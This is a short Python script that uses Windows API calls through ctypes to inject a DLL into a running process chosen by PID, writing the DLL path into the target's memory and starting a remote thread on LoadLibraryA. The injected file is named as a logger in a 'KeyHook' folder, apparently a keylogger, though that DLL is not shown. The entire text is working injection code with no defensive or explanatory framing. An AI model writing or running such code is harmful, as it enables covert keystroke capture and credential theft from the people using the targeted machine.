import ctypes
import sys

pid = int(sys.argv[1])
dll_path = "C:\\Users\\X\\Desktop\\KeyHook\\logger.dll"

PROCESS_ALL_ACCESS = 0x1F0FFF

# Load libraries
kernel32 = ctypes.windll.kernel32

# Open process
handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory
arg_address = kernel32.VirtualAllocEx(handle, 0, len(dll_path)+1, 0x1000, 0x04)

# Write DLL path
kernel32.WriteProcessMemory(handle, arg_address, dll_path.encode('ascii'), len(dll_path)+1, None)

# Get LoadLibraryA address
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
loadlib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

# Create remote thread
kernel32.CreateRemoteThread(handle, None, 0, loadlib_addr, arg_address, 0, None)

print(f"Injected {dll_path} into PID {pid}")
